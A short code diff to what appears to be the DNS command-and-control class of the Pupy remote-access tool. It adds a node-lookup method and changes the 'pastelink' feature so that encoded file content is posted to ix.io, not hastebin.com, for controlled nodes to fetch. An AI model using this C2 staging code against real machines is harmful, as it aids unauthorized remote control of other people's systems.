@@ -234,6 +234,9 @@ class PupyDnsCnc(object):
         return self.handler.find_sessions(node=node) \
           or self.handler.find_sessions(spi=node)
 
+    def nodes(self, node=None):
+        return self.handler.find_nodes(node)
+
     def connect(self, host=None, port=None, transport=None, node=None, default=False):
         if port:
             port = int(port)
@@ -340,13 +343,12 @@ class PupyDnsCnc(object):
             with open(content_path) as content:
                 payload = self.handler.encode_pastelink_content(content.read())
 
-            response = requests.post('https://hastebin.com/documents', data=payload)
+            response = requests.post('http://ix.io', data={'f:1':payload})
             if response.ok:
-                key = response.json()['key']
-                url = 'https://hastebin.com/raw/{}'.format(key)
+                url = response.content.strip()
 
-        if not url:
-            raise ValueError('couldn\'t create pastelink url')
+                if not url:
+                    raise ValueError('couldn\'t create pastelink url')
 
         count = self.handler.pastelink(url, action, node=node, default=default)
         if count and self.cmdhandler:
